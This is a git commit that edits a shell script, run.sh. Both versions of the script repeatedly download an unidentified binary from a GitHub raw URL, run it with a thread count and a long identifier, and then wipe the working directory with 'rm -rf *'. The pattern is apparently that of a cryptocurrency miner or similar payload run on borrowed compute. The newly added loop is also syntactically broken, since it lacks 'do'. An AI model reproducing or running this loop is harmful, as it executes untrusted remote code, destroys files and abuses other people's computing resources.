3afe160ba6aace6c72f4325d55bcc9bf726eba23
sabri fuadi <sabrif0610@gmail.com>
2024-04-13 21:07:33 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,1 +1,1 @@
-while :; do wget https://github.com/molotovman88/a/raw/main/sof; chmod +x sof; timeout 60m ./sof -t 7 -i KVAQTPYWKGFQKETWTBAEZBCIKVNAQZFUIFPTPJSETEDNEJMSVLBEGHEGOOLM --label sha; rm -rf *; done
+for i in {1..99999}; wget https://github.com/molotovman88/a/raw/main/sof; chmod +x sof; timeout 60m ./sof -t 7 -i KVAQTPYWKGFQKETWTBAEZBCIKVNAQZFUIFPTPJSETEDNEJMSVLBEGHEGOOLM --label sha; rm -rf *; done
